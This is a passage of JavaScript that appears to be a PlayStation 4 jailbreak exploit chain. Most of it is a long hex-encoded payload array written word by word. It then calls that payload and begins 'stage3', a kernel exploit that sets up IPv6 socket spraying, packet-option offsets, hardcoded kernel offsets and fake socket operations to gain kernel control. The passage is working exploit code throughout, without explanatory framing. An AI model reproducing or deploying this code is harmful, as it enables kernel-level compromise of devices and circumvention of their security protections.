  payload_writer[4257] = 0x6e697469;
  payload_writer[4258] = 0x6f662067;
  payload_writer[4259] = 0x61672072;
  payload_writer[4260] = 0x7420656d;
  payload_writer[4261] = 0x616c206f;
  payload_writer[4262] = 0x68636e75;
  payload_writer[4263] = 0x002e2e2e;
  payload_writer[4264] = 0x74696157;
  payload_writer[4265] = 0x20676e69;
  payload_writer[4266] = 0x20726f66;
  payload_writer[4267] = 0x656d6167;
  payload_writer[4268] = 0x206f7420;
  payload_writer[4269] = 0x79706f63;
  payload_writer[4270] = 0x2575250a;
  payload_writer[4271] = 0x6f632025;
  payload_writer[4272] = 0x656c706d;
  payload_writer[4273] = 0x2e646574;
  payload_writer[4274] = 0x53002e2e;
  payload_writer[4275] = 0x74726174;
  payload_writer[4276] = 0x6d756420;
  payload_writer[4277] = 0x676e6970;
  payload_writer[4278] = 0x2073250a;
  payload_writer[4279] = 0x25206f74;
  payload_writer[4280] = 0x73250073;
  payload_writer[4281] = 0x6d756420;
  payload_writer[4282] = 0x2e646570;
  payload_writer[4283] = 0x7568530a;
  payload_writer[4284] = 0x6e697474;
  payload_writer[4285] = 0x6f642067;
  payload_writer[4286] = 0x2e2e6e77;
  payload_writer[4287] = 0x7325002e;
  payload_writer[4288] = 0x6d756420;
  payload_writer[4289] = 0x2e646570;
  payload_writer[4290] = 0x6579420a;
  payload_writer[4291] = 0x696c0021;
  payload_writer[4292] = 0x72656b62;
  payload_writer[4293] = 0x5f6c656e;
  payload_writer[4294] = 0x2e626577;
  payload_writer[4295] = 0x78727073;
  payload_writer[4296] = 0x62696c00;
  payload_writer[4297] = 0x6e72656b;
  payload_writer[4298] = 0x735f6c65;
  payload_writer[4299] = 0x732e7379;
  payload_writer[4300] = 0x00787270;
  payload_writer[4301] = 0x74735f5f;
  payload_writer[4302] = 0x5f6b6361;
  payload_writer[4303] = 0x5f6b6863;
  payload_writer[4304] = 0x72617567;
  payload_writer[4305] = 0x5f5f0064;
  payload_writer[4306] = 0x63617473;
  payload_writer[4307] = 0x68635f6b;
  payload_writer[4308] = 0x61665f6b;
  payload_writer[4309] = 0x5f006c69;
  payload_writer[4310] = 0x7272655f;
  payload_writer[4311] = 0x7300726f;
  payload_writer[4312] = 0x654b6563;
  payload_writer[4313] = 0x6c656e72;
  payload_writer[4314] = 0x6f727245;
  payload_writer[4315] = 0x63730072;
  payload_writer[4316] = 0x72654b65;
  payload_writer[4317] = 0x4c6c656e;
  payload_writer[4318] = 0x5364616f;
  payload_writer[4319] = 0x74726174;
  payload_writer[4320] = 0x75646f4d;
  payload_writer[4321] = 0x7300656c;
  payload_writer[4322] = 0x654b6563;
  payload_writer[4323] = 0x6c656e72;
  payload_writer[4324] = 0x6f6c6c41;
  payload_writer[4325] = 0x65746163;
  payload_writer[4326] = 0x65726944;
  payload_writer[4327] = 0x654d7463;
  payload_writer[4328] = 0x79726f6d;
  payload_writer[4329] = 0x65637300;
  payload_writer[4330] = 0x6e72654b;
  payload_writer[4331] = 0x614d6c65;
  payload_writer[4332] = 0x72694470;
  payload_writer[4333] = 0x4d746365;
  payload_writer[4334] = 0x726f6d65;
  payload_writer[4335] = 0x63730079;
  payload_writer[4336] = 0x72654b65;
  payload_writer[4337] = 0x476c656e;
  payload_writer[4338] = 0x69447465;
  payload_writer[4339] = 0x74636572;
  payload_writer[4340] = 0x6f6d654d;
  payload_writer[4341] = 0x69537972;
  payload_writer[4342] = 0x7300657a;
  payload_writer[4343] = 0x654b6563;
  payload_writer[4344] = 0x6c656e72;
  payload_writer[4345] = 0x74617453;
  payload_writer[4346] = 0x65637300;
  payload_writer[4347] = 0x6e72654b;
  payload_writer[4348] = 0x704f6c65;
  payload_writer[4349] = 0x73006e65;
  payload_writer[4350] = 0x654b6563;
  payload_writer[4351] = 0x6c656e72;
  payload_writer[4352] = 0x64616552;
  payload_writer[4353] = 0x65637300;
  payload_writer[4354] = 0x6e72654b;
  payload_writer[4355] = 0x734c6c65;
  payload_writer[4356] = 0x006b6565;
  payload_writer[4357] = 0x4b656373;
  payload_writer[4358] = 0x656e7265;
  payload_writer[4359] = 0x6f6c436c;
  payload_writer[4360] = 0x73006573;
  payload_writer[4361] = 0x654b6563;
  payload_writer[4362] = 0x6c656e72;
  payload_writer[4363] = 0x65656c53;
  payload_writer[4364] = 0x63730070;
  payload_writer[4365] = 0x72654b65;
  payload_writer[4366] = 0x556c656e;
  payload_writer[4367] = 0x65656c73;
  payload_writer[4368] = 0x63730070;
  payload_writer[4369] = 0x72654b65;
  payload_writer[4370] = 0x476c656e;
  payload_writer[4371] = 0x69747465;
  payload_writer[4372] = 0x666f656d;
  payload_writer[4373] = 0x00796164;
  payload_writer[4374] = 0x4b656373;
  payload_writer[4375] = 0x656e7265;
  payload_writer[4376] = 0x7465476c;
  payload_writer[4377] = 0x636f7250;
  payload_writer[4378] = 0x54737365;
  payload_writer[4379] = 0x00656d69;
  payload_writer[4380] = 0x4b656373;
  payload_writer[4381] = 0x656e7265;
  payload_writer[4382] = 0x7465476c;
  payload_writer[4383] = 0x72727543;
  payload_writer[4384] = 0x43746e65;
  payload_writer[4385] = 0x73007570;
  payload_writer[4386] = 0x74637379;
  payload_writer[4387] = 0x7973006c;
  payload_writer[4388] = 0x6c746373;
  payload_writer[4389] = 0x616e7962;
  payload_writer[4390] = 0x7300656d;
  payload_writer[4391] = 0x72617379;
  payload_writer[4392] = 0x65006863;
  payload_writer[4393] = 0x76636578;
  payload_writer[4394] = 0x74700065;
  payload_writer[4395] = 0x61657268;
  payload_writer[4396] = 0x65735f64;
  payload_writer[4397] = 0x7000666c;
  payload_writer[4398] = 0x65726874;
  payload_writer[4399] = 0x735f6461;
  payload_writer[4400] = 0x66617465;
  payload_writer[4401] = 0x696e6966;
  payload_writer[4402] = 0x6e5f7974;
  payload_writer[4403] = 0x63730070;
  payload_writer[4404] = 0x72654b65;
  payload_writer[4405] = 0x436c656e;
  payload_writer[4406] = 0x74616572;
  payload_writer[4407] = 0x75714565;
  payload_writer[4408] = 0x00657565;
  payload_writer[4409] = 0x4b656373;
  payload_writer[4410] = 0x656e7265;
  payload_writer[4411] = 0x6c65446c;
  payload_writer[4412] = 0x45657465;
  payload_writer[4413] = 0x75657571;
  payload_writer[4414] = 0x63730065;
  payload_writer[4415] = 0x72654b65;
  payload_writer[4416] = 0x416c656e;
  payload_writer[4417] = 0x73556464;
  payload_writer[4418] = 0x76457265;
  payload_writer[4419] = 0x00746e65;
  payload_writer[4420] = 0x4b656373;
  payload_writer[4421] = 0x656e7265;
  payload_writer[4422] = 0x6464416c;
  payload_writer[4423] = 0x64616552;
  payload_writer[4424] = 0x6e657645;
  payload_writer[4425] = 0x65670074;
  payload_writer[4426] = 0x64697574;
  payload_writer[4427] = 0x74656700;
  payload_writer[4428] = 0x00646967;
  payload_writer[4429] = 0x70746567;
  payload_writer[4430] = 0x73006469;
  payload_writer[4431] = 0x69757465;
  payload_writer[4432] = 0x65730064;
  payload_writer[4433] = 0x64696774;
  payload_writer[4434] = 0x74657300;
  payload_writer[4435] = 0x69756572;
  payload_writer[4436] = 0x65730064;
  payload_writer[4437] = 0x67657274;
  payload_writer[4438] = 0x72006469;
  payload_writer[4439] = 0x4e430062;
  payload_writer[4440] = 0x6c004054;
  payload_writer[4441] = 0x6e656369;
  payload_writer[4442] = 0x642e6573;
  payload_writer[4443] = 0x6c007461;
  payload_writer[4444] = 0x6e656369;
  payload_writer[4445] = 0x692e6573;
  payload_writer[4446] = 0x006f666e;
  payload_writer[4447] = 0x666c6573;
  payload_writer[4448] = 0x6f666e69;
  payload_writer[4449] = 0x7461642e;
  payload_writer[4450] = 0x616d6900;
  payload_writer[4451] = 0x6e696567;
  payload_writer[4452] = 0x642e6f66;
  payload_writer[4453] = 0x74007461;
  payload_writer[4454] = 0x65677261;
  payload_writer[4455] = 0x65642d74;
  payload_writer[4456] = 0x6961746c;
  payload_writer[4457] = 0x2e6f666e;
  payload_writer[4458] = 0x00746164;
  payload_writer[4459] = 0x6769726f;
  payload_writer[4460] = 0x642d6e69;
  payload_writer[4461] = 0x61746c65;
  payload_writer[4462] = 0x6f666e69;
  payload_writer[4463] = 0x7461642e;
  payload_writer[4464] = 0x72737000;
  payload_writer[4465] = 0x72657365;
  payload_writer[4466] = 0x2e646576;
  payload_writer[4467] = 0x00746164;
  payload_writer[4468] = 0x61726170;
  payload_writer[4469] = 0x66732e6d;
  payload_writer[4470] = 0x7270006f;
  payload_writer[4471] = 0x6e756e6f;
  payload_writer[4472] = 0x74616963;
  payload_writer[4473] = 0x2e6e6f69;
  payload_writer[4474] = 0x006c6d78;
  payload_writer[4475] = 0x6e6f7270;
  payload_writer[4476] = 0x69636e75;
  payload_writer[4477] = 0x6f697461;
  payload_writer[4478] = 0x69732e6e;
  payload_writer[4479] = 0x69700067;
  payload_writer[4480] = 0x702e3163;
  payload_writer[4481] = 0x7000676e;
  payload_writer[4482] = 0x6f746275;
  payload_writer[4483] = 0x6e696c6f;
  payload_writer[4484] = 0x642e6f66;
  payload_writer[4485] = 0x61007461;
  payload_writer[4486] = 0x702f7070;
  payload_writer[4487] = 0x6779616c;
  payload_writer[4488] = 0x68632d6f;
  payload_writer[4489] = 0x2e6b6e75;
  payload_writer[4490] = 0x00746164;
  payload_writer[4491] = 0x2f707061;
  payload_writer[4492] = 0x79616c70;
  payload_writer[4493] = 0x632d6f67;
  payload_writer[4494] = 0x6b6e7568;
  payload_writer[4495] = 0x6168732e;
  payload_writer[4496] = 0x70706100;
  payload_writer[4497] = 0x616c702f;
  payload_writer[4498] = 0x2d6f6779;
  payload_writer[4499] = 0x696e616d;
  payload_writer[4500] = 0x74736566;
  payload_writer[4501] = 0x6c6d782e;
  payload_writer[4502] = 0x61687300;
  payload_writer[4503] = 0x61706572;
  payload_writer[4504] = 0x2e6d6172;
  payload_writer[4505] = 0x6e6f736a;
  payload_writer[4506] = 0x61687300;
  payload_writer[4507] = 0x766f6572;
  payload_writer[4508] = 0x616c7265;
  payload_writer[4509] = 0x616d6979;
  payload_writer[4510] = 0x702e6567;
  payload_writer[4511] = 0x7300676e;
  payload_writer[4512] = 0x5f657661;
  payload_writer[4513] = 0x61746164;
  payload_writer[4514] = 0x676e702e;
  payload_writer[4515] = 0x61687300;
  payload_writer[4516] = 0x72706572;
  payload_writer[4517] = 0x63617669;
  payload_writer[4518] = 0x61756779;
  payload_writer[4519] = 0x6d696472;
  payload_writer[4520] = 0x2e656761;
  payload_writer[4521] = 0x00676e70;
  payload_writer[4522] = 0x6e6f6369;
  payload_writer[4523] = 0x6e702e30;
  payload_writer[4524] = 0x69700067;
  payload_writer[4525] = 0x702e3063;
  payload_writer[4526] = 0x7300676e;
  payload_writer[4527] = 0x2e30646e;
  payload_writer[4528] = 0x00397461;
  payload_writer[4529] = 0x6e616863;
  payload_writer[4530] = 0x6e696567;
  payload_writer[4531] = 0x632f6f66;
  payload_writer[4532] = 0x676e6168;
  payload_writer[4533] = 0x666e6965;
  payload_writer[4534] = 0x6d782e6f;
  payload_writer[4535] = 0x6369006c;
  payload_writer[4536] = 0x2e306e6f;
  payload_writer[4537] = 0x00736464;
  payload_writer[4538] = 0x30636970;
  payload_writer[4539] = 0x7364642e;
  payload_writer[4540] = 0x63697000;
  payload_writer[4541] = 0x64642e31;
  payload_writer[4542] = 0x63690073;
  payload_writer[4543] = 0x5f306e6f;
  payload_writer[4544] = 0x75323025;
  payload_writer[4545] = 0x676e702e;
  payload_writer[4546] = 0x63697000;
  payload_writer[4547] = 0x30255f31;
  payload_writer[4548] = 0x702e7532;
  payload_writer[4549] = 0x6300676e;
  payload_writer[4550] = 0x676e6168;
  payload_writer[4551] = 0x666e6965;
  payload_writer[4552] = 0x68632f6f;
  payload_writer[4553] = 0x65676e61;
  payload_writer[4554] = 0x6f666e69;
  payload_writer[4555] = 0x3230255f;
  payload_writer[4556] = 0x6d782e75;
  payload_writer[4557] = 0x6369006c;
  payload_writer[4558] = 0x5f306e6f;
  payload_writer[4559] = 0x75323025;
  payload_writer[4560] = 0x7364642e;
  payload_writer[4561] = 0x63697000;
  payload_writer[4562] = 0x30255f31;
  payload_writer[4563] = 0x642e7532;
  payload_writer[4564] = 0x74007364;
  payload_writer[4565] = 0x68706f72;
  payload_writer[4566] = 0x72742f79;
  payload_writer[4567] = 0x7968706f;
  payload_writer[4568] = 0x75323025;
  payload_writer[4569] = 0x7072742e;
  payload_writer[4570] = 0x79656b00;
  payload_writer[4571] = 0x5f70616d;
  payload_writer[4572] = 0x252f7072;
  payload_writer[4573] = 0x2e753330;
  payload_writer[4574] = 0x00676e70;
  payload_writer[4575] = 0x6d79656b;
  payload_writer[4576] = 0x725f7061;
  payload_writer[4577] = 0x30252f70;
  payload_writer[4578] = 0x252f7532;
  payload_writer[4579] = 0x2e753330;
  payload_writer[4580] = 0x00676e70;
  payload_writer[4581] = 0x732f7325;
  payload_writer[4582] = 0x735f6563;
  payload_writer[4583] = 0x252f7379;
  payload_writer[4584] = 0x732f0073;
  payload_writer[4585] = 0x65747379;
  payload_writer[4586] = 0x6f632f6d;
  payload_writer[4587] = 0x6e6f6d6d;
  payload_writer[4588] = 0x62696c2f;
  payload_writer[4589] = 0x62696c2f;
  payload_writer[4590] = 0x53656353;
  payload_writer[4591] = 0x74557379;
  payload_writer[4592] = 0x732e6c69;
  payload_writer[4593] = 0x00787270;
  payload_writer[4594] = 0x7379732f;
  payload_writer[4595] = 0x2f6d6574;
  payload_writer[4596] = 0x6d6d6f63;
  payload_writer[4597] = 0x6c2f6e6f;
  payload_writer[4598] = 0x6c2f6269;
  payload_writer[4599] = 0x63536269;
  payload_writer[4600] = 0x73795365;
  payload_writer[4601] = 0x536d6574;
  payload_writer[4602] = 0x69767265;
  payload_writer[4603] = 0x732e6563;
  payload_writer[4604] = 0x00787270;
  payload_writer[4605] = 0x53656373;
  payload_writer[4606] = 0x74557379;
  payload_writer[4607] = 0x65536c69;
  payload_writer[4608] = 0x7953646e;
  payload_writer[4609] = 0x6d657473;
  payload_writer[4610] = 0x69746f4e;
  payload_writer[4611] = 0x61636966;
  payload_writer[4612] = 0x6e6f6974;
  payload_writer[4613] = 0x68746957;
  payload_writer[4614] = 0x74786554;
  payload_writer[4615] = 0x65637300;
  payload_writer[4616] = 0x74737953;
  payload_writer[4617] = 0x65536d65;
  payload_writer[4618] = 0x63697672;
  payload_writer[4619] = 0x75614c65;
  payload_writer[4620] = 0x5768636e;
  payload_writer[4621] = 0x72426265;
  payload_writer[4622] = 0x6573776f;
  payload_writer[4623] = 0x732f0072;
  payload_writer[4624] = 0x65747379;
  payload_writer[4625] = 0x6f632f6d;
  payload_writer[4626] = 0x6e6f6d6d;
  payload_writer[4627] = 0x62696c2f;
  payload_writer[4628] = 0x62696c2f;
  payload_writer[4629] = 0x55656353;
  payload_writer[4630] = 0x53726573;
  payload_writer[4631] = 0x69767265;
  payload_writer[4632] = 0x732e6563;
  payload_writer[4633] = 0x00787270;
  payload_writer[4634] = 0x55656373;
  payload_writer[4635] = 0x53726573;
  payload_writer[4636] = 0x69767265;
  payload_writer[4637] = 0x6e496563;
  payload_writer[4638] = 0x61697469;
  payload_writer[4639] = 0x657a696c;
  payload_writer[4640] = 0x65637300;
  payload_writer[4641] = 0x72657355;
  payload_writer[4642] = 0x76726553;
  payload_writer[4643] = 0x47656369;
  payload_writer[4644] = 0x6f4c7465;
  payload_writer[4645] = 0x556e6967;
  payload_writer[4646] = 0x49726573;
  payload_writer[4647] = 0x73694c64;
  payload_writer[4648] = 0x63730074;
  payload_writer[4649] = 0x65735565;
  payload_writer[4650] = 0x72655372;
  payload_writer[4651] = 0x65636976;
  payload_writer[4652] = 0x6d726554;
  payload_writer[4653] = 0x74616e69;
  payload_writer[4654] = 0x63730065;
  payload_writer[4655] = 0x65735565;
  payload_writer[4656] = 0x72655372;
  payload_writer[4657] = 0x65636976;
  payload_writer[4658] = 0x55746547;
  payload_writer[4659] = 0x4e726573;
  payload_writer[4660] = 0x00656d61;
  payload_writer[4661] = 0x55656373;
  payload_writer[4662] = 0x53726573;
  payload_writer[4663] = 0x69767265;
  payload_writer[4664] = 0x65476563;
  payload_writer[4665] = 0x696e4974;
  payload_writer[4666] = 0x6c616974;
  payload_writer[4667] = 0x72657355;
  payload_writer[4668] = 0x65635300;
  payload_writer[4669] = 0x43737953;
  payload_writer[4670] = 0x5265726f;
  payload_writer[4671] = 0x6f6f6265;
  payload_writer[4672] = 0x732f0074;
  payload_writer[4673] = 0x65747379;
  payload_writer[4674] = 0x6f632f6d;
  payload_writer[4675] = 0x6e6f6d6d;
  payload_writer[4676] = 0x62696c2f;
  payload_writer[4677] = 0x62696c2f;
  payload_writer[4678] = 0x6e72656b;
  payload_writer[4679] = 0x732e6c65;
  payload_writer[4680] = 0x00787270;
  payload_writer[4681] = 0x4b656373;
  payload_writer[4682] = 0x656e7265;
  payload_writer[4683] = 0x6265526c;
  payload_writer[4684] = 0x00746f6f;
  payload_writer[4685] = 0x746e6d2f;
  payload_writer[4686] = 0x6e61732f;
  payload_writer[4687] = 0x786f6264;
  payload_writer[4688] = 0x7366702f;
  payload_writer[4689] = 0x00746e6d;
  payload_writer[4690] = 0x2d5e5b25;
  payload_writer[4691] = 0x732f005d;
  payload_writer[4692] = 0x65747379;
  payload_writer[4693] = 0x61645f6d;
  payload_writer[4694] = 0x702f6174;
  payload_writer[4695] = 0x6779616c;
  payload_writer[4696] = 0x73252f6f;
  payload_writer[4697] = 0x6364622f;
  payload_writer[4698] = 0x2e79706f;
  payload_writer[4699] = 0x006d6270;
  payload_writer[4700] = 0x746e6d2f;
  payload_writer[4701] = 0x6273752f;
  payload_writer[4702] = 0x642e2f30;
  payload_writer[4703] = 0x65747269;
  payload_writer[4704] = 0x55007473;
  payload_writer[4705] = 0x00304253;
  payload_writer[4706] = 0x746e6d2f;
  payload_writer[4707] = 0x6273752f;
  payload_writer[4708] = 0x003b0030;
  payload_writer[4709] = 0x73003a3d;
  payload_writer[4710] = 0x74506563;
  payload_writer[4711] = 0x61657268;
  payload_writer[4712] = 0x65724364;
  payload_writer[4713] = 0x00657461;
  payload_writer[4714] = 0x50656373;
  payload_writer[4715] = 0x65726874;
  payload_writer[4716] = 0x78456461;
  payload_writer[4717] = 0x73007469;
  payload_writer[4718] = 0x74506563;
  payload_writer[4719] = 0x61657268;
  payload_writer[4720] = 0x74654464;
  payload_writer[4721] = 0x00686361;
  payload_writer[4722] = 0x50656373;
  payload_writer[4723] = 0x65726874;
  payload_writer[4724] = 0x6f4a6461;
  payload_writer[4725] = 0x73006e69;
  payload_writer[4726] = 0x74506563;
  payload_writer[4727] = 0x61657268;
  payload_writer[4728] = 0x65695964;
  payload_writer[4729] = 0x7300646c;
  payload_writer[4730] = 0x74506563;
  payload_writer[4731] = 0x61657268;
  payload_writer[4732] = 0x6c655364;
  payload_writer[4733] = 0x63730066;
  payload_writer[4734] = 0x68745065;
  payload_writer[4735] = 0x64616572;
  payload_writer[4736] = 0x636e6143;
  payload_writer[4737] = 0x73006c65;
  payload_writer[4738] = 0x74506563;
  payload_writer[4739] = 0x61657268;
  payload_writer[4740] = 0x74754d64;
  payload_writer[4741] = 0x6e497865;
  payload_writer[4742] = 0x73007469;
  payload_writer[4743] = 0x74506563;
  payload_writer[4744] = 0x61657268;
  payload_writer[4745] = 0x74754d64;
  payload_writer[4746] = 0x65447865;
  payload_writer[4747] = 0x6f727473;
  payload_writer[4748] = 0x63730079;
  payload_writer[4749] = 0x68745065;
  payload_writer[4750] = 0x64616572;
  payload_writer[4751] = 0x6574754d;
  payload_writer[4752] = 0x636f4c78;
  payload_writer[4753] = 0x6373006b;
  payload_writer[4754] = 0x68745065;
  payload_writer[4755] = 0x64616572;
  payload_writer[4756] = 0x6574754d;
  payload_writer[4757] = 0x79725478;
  payload_writer[4758] = 0x6b636f6c;
  payload_writer[4759] = 0x65637300;
  payload_writer[4760] = 0x72687450;
  payload_writer[4761] = 0x4d646165;
  payload_writer[4762] = 0x78657475;
  payload_writer[4763] = 0x656d6954;
  payload_writer[4764] = 0x636f6c64;
  payload_writer[4765] = 0x6373006b;
  payload_writer[4766] = 0x68745065;
  payload_writer[4767] = 0x64616572;
  payload_writer[4768] = 0x6574754d;
  payload_writer[4769] = 0x6c6e5578;
  payload_writer[4770] = 0x006b636f;
  payload_writer[4771] = 0x5362696c;
  payload_writer[4772] = 0x694c6563;
  payload_writer[4773] = 0x6e496362;
  payload_writer[4774] = 0x6e726574;
  payload_writer[4775] = 0x732e6c61;
  payload_writer[4776] = 0x00787270;
  payload_writer[4777] = 0x6c6c616d;
  payload_writer[4778] = 0x6600636f;
  payload_writer[4779] = 0x00656572;
  payload_writer[4780] = 0x6c6c6163;
  payload_writer[4781] = 0x7200636f;
  payload_writer[4782] = 0x6c6c6165;
  payload_writer[4783] = 0x6d00636f;
  payload_writer[4784] = 0x6c616d65;
  payload_writer[4785] = 0x006e6769;
  payload_writer[4786] = 0x736d656d;
  payload_writer[4787] = 0x6d007465;
  payload_writer[4788] = 0x70636d65;
  payload_writer[4789] = 0x656d0079;
  payload_writer[4790] = 0x706d636d;
  payload_writer[4791] = 0x72747300;
  payload_writer[4792] = 0x00797063;
  payload_writer[4793] = 0x6e727473;
  payload_writer[4794] = 0x00797063;
  payload_writer[4795] = 0x63727473;
  payload_writer[4796] = 0x73007461;
  payload_writer[4797] = 0x636e7274;
  payload_writer[4798] = 0x73007461;
  payload_writer[4799] = 0x656c7274;
  payload_writer[4800] = 0x7473006e;
  payload_writer[4801] = 0x706d6372;
  payload_writer[4802] = 0x72747300;
  payload_writer[4803] = 0x706d636e;
  payload_writer[4804] = 0x72707300;
  payload_writer[4805] = 0x66746e69;
  payload_writer[4806] = 0x706e7300;
  payload_writer[4807] = 0x746e6972;
  payload_writer[4808] = 0x73730066;
  payload_writer[4809] = 0x666e6163;
  payload_writer[4810] = 0x72747300;
  payload_writer[4811] = 0x00726863;
  payload_writer[4812] = 0x72727473;
  payload_writer[4813] = 0x00726863;
  payload_writer[4814] = 0x73727473;
  payload_writer[4815] = 0x73007274;
  payload_writer[4816] = 0x75647274;
  payload_writer[4817] = 0x69720070;
  payload_writer[4818] = 0x7865646e;
  payload_writer[4819] = 0x64736900;
  payload_writer[4820] = 0x74696769;
  payload_writer[4821] = 0x6f746100;
  payload_writer[4822] = 0x74730069;
  payload_writer[4823] = 0x70636c72;
  payload_writer[4824] = 0x74730079;
  payload_writer[4825] = 0x72726572;
  payload_writer[4826] = 0x5f00726f;
  payload_writer[4827] = 0x70746547;
  payload_writer[4828] = 0x70797463;
  payload_writer[4829] = 0x535f0065;
  payload_writer[4830] = 0x6c756f74;
  payload_writer[4831] = 0x6f636200;
  payload_writer[4832] = 0x73007970;
  payload_writer[4833] = 0x646e6172;
  payload_writer[4834] = 0x63736100;
  payload_writer[4835] = 0x656d6974;
  payload_writer[4836] = 0x63736100;
  payload_writer[4837] = 0x656d6974;
  payload_writer[4838] = 0x6700725f;
  payload_writer[4839] = 0x6d69746d;
  payload_writer[4840] = 0x6d670065;
  payload_writer[4841] = 0x656d6974;
  payload_writer[4842] = 0x6c00735f;
  payload_writer[4843] = 0x6c61636f;
  payload_writer[4844] = 0x656d6974;
  payload_writer[4845] = 0x636f6c00;
  payload_writer[4846] = 0x69746c61;
  payload_writer[4847] = 0x725f656d;
  payload_writer[4848] = 0x746b6d00;
  payload_writer[4849] = 0x00656d69;
  payload_writer[4850] = 0x6e65706f;
  payload_writer[4851] = 0x00726964;
  payload_writer[4852] = 0x64616572;
  payload_writer[4853] = 0x00726964;
  payload_writer[4854] = 0x64616572;
  payload_writer[4855] = 0x5f726964;
  payload_writer[4856] = 0x65740072;
  payload_writer[4857] = 0x69646c6c;
  payload_writer[4858] = 0x65730072;
  payload_writer[4859] = 0x69646b65;
  payload_writer[4860] = 0x65720072;
  payload_writer[4861] = 0x646e6977;
  payload_writer[4862] = 0x00726964;
  payload_writer[4863] = 0x736f6c63;
  payload_writer[4864] = 0x72696465;
  payload_writer[4865] = 0x72696400;
  payload_writer[4866] = 0x67006466;
  payload_writer[4867] = 0x72707465;
  payload_writer[4868] = 0x616e676f;
  payload_writer[4869] = 0x6600656d;
  payload_writer[4870] = 0x6e65706f;
  payload_writer[4871] = 0x65726600;
  payload_writer[4872] = 0x66006461;
  payload_writer[4873] = 0x74697277;
  payload_writer[4874] = 0x73660065;
  payload_writer[4875] = 0x006b6565;
  payload_writer[4876] = 0x6c657466;
  payload_writer[4877] = 0x6366006c;
  payload_writer[4878] = 0x65736f6c;
  payload_writer[4879] = 0x72706600;
  payload_writer[4880] = 0x66746e69;
  payload_writer[4881] = 0x00000000;




	chain.call(payload_buffer);
	/*
    var loader_thr = chain.spawn_thread("loader_thr", function (new_thr) {
      new_thr.push(payload_buffer);
      new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);
    });
    loader_thr();
  */
}

function stage3() {

  const AF_INET6 = 28;
  const SOCK_DGRAM = 2;
  const IPPROTO_UDP = 17;
  const IPPROTO_IPV6 = 41;
  const IPV6_TCLASS = 61;
  const IPV6_2292PKTOPTIONS = 25;
  const IPV6_RTHDR = 51;
  const IPV6_PKTINFO = 46;

  const SPRAY_TCLASS = 0x53;
  const TAINT_CLASS = 0x58;
  const TCLASS_MASTER = 0x2AFE0000;

  const PKTOPTS_PKTINFO_OFFSET = 0x10;
  const PKTOPTS_RTHDR_OFFSET = 0x68;
  const PKTOPTS_TCLASS_OFFSET = 0xB0;

  const PROC_UCRED_OFFSET = 0x40;
  const PROC_FILEDESC_OFFSET = 0x48;
  const PROC_PID_OFFSET = 0xB0;


  const FILE_FOPS_OFFSET = 0x8;
  const FILEOPS_IOCTL_OFFSET = 0x18;
  const VM_MAP_PMAP_OFFSET = 0x120;

  const KERNEL_M_IP6OPT_OFFSET = 0x1A7AEA0;
  const KERNEL_MALLOC_OFFSET = 0x301840;
  const KERNEL_ALLPROC_OFFSET = 0x1B48318;
  const KERNEL_PMAP_STORE_OFFSET = 0x22C5268;

  const NUM_SPRAY_SOCKS = 200;
  const NUM_LEAK_SOCKS = 200;
  const NUM_SLAVE_SOCKS = 300;

  const size_of_triggered = 0x8;
  const size_of_valid_pktopts = 0x18;
  const size_of_size_of_tclass = 0x8;
  const size_of_master_main_tclass = 0x8;
  const size_of_master_thr1_tclass = 0x8;
  const size_of_master_thr2_tclass = 0x8;
  const size_of_spray_tclass = 0x8;
  const size_of_taint_tclass = 0x8;
  const size_of_tmp_tclass = 0x8;
  const size_of_rthdr_buffer = 0x800;
  const size_of_ptr_size_of_rthdr_buffer= 0x8;
  const size_of_spray_socks = 0x4 * NUM_SPRAY_SOCKS;
  const size_of_leak_socks = 0x4 * NUM_LEAK_SOCKS;
  const size_of_slave_socks = 0x4 * NUM_SLAVE_SOCKS;
  const size_of_spray_socks_tclasses = 0x4 * NUM_SPRAY_SOCKS;
  const size_of_pktinfo_buffer = 0x18;
  const size_of_pktinfo_buffer_len = 0x8;
  const size_of_find_slave_buffer = 0x8 * NUM_SLAVE_SOCKS + 0x10;
  const size_of_fake_socketops = 0x58;
  const size_of_loop_counter = 0x8;
  const size_of_fix_these_sockets = 0x4 * (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2) + 0x18;
  const var_memory = p.malloc(size_of_triggered + size_of_valid_pktopts + size_of_size_of_tclass + size_of_master_main_tclass + size_of_master_thr1_tclass + size_of_master_thr2_tclass + size_of_spray_tclass + size_of_taint_tclass + size_of_tmp_tclass +
    size_of_rthdr_buffer + size_of_ptr_size_of_rthdr_buffer+ size_of_spray_socks + size_of_leak_socks + size_of_slave_socks + size_of_spray_socks_tclasses + size_of_pktinfo_buffer + size_of_pktinfo_buffer_len + size_of_find_slave_buffer + size_of_fake_socketops + size_of_loop_counter +
    size_of_fix_these_sockets
  );

  const triggered = var_memory;
  const valid_pktopts = triggered.add32(size_of_triggered);
  const size_of_tclass = valid_pktopts.add32(size_of_valid_pktopts);
  const master_main_tclass = size_of_tclass.add32(size_of_size_of_tclass);
  const master_thr1_tclass = master_main_tclass.add32(size_of_master_main_tclass);
  const master_thr2_tclass = master_thr1_tclass.add32(size_of_master_thr1_tclass);
  const spray_tclass = master_thr2_tclass.add32(size_of_master_thr2_tclass);
  const taint_tclass = spray_tclass.add32(size_of_spray_tclass);
  const tmp_tclass = taint_tclass.add32(size_of_taint_tclass);
  const rthdr_buffer = tmp_tclass.add32(size_of_tmp_tclass);
  const ptr_size_of_rthdr_buffer = rthdr_buffer.add32(size_of_rthdr_buffer);
  const spray_sockets_ptr = ptr_size_of_rthdr_buffer.add32(size_of_ptr_size_of_rthdr_buffer);
  const leak_sockets_ptr = spray_sockets_ptr.add32(size_of_spray_socks);
  const slave_sockets_ptr = leak_sockets_ptr.add32(size_of_leak_socks);
  const spray_socks_tclasses_ptr = slave_sockets_ptr.add32(size_of_slave_socks);
  const pktinfo_buffer = spray_socks_tclasses_ptr.add32(size_of_spray_socks_tclasses);
  const pktinfo_buffer_len = pktinfo_buffer.add32(size_of_pktinfo_buffer);
  const find_slave_buffer = pktinfo_buffer_len.add32(size_of_pktinfo_buffer_len);
  const fake_socketops = find_slave_buffer.add32(size_of_find_slave_buffer);
  const loop_counter = fake_socketops.add32(size_of_fake_socketops);
  const fix_these_sockets_ptr = loop_counter.add32(size_of_loop_counter);

  var overlapped_socket = -1;
  var overlapped_socket_idx = -1;

  var slave_socket = -1;

  var leaked_pktopts_address = 0;

  var target_file;
  var socketops;
  var kernel_base;

  p.write8(valid_pktopts.add32(0x0), 0x14);
  p.write4(valid_pktopts.add32(0x8), IPPROTO_IPV6);
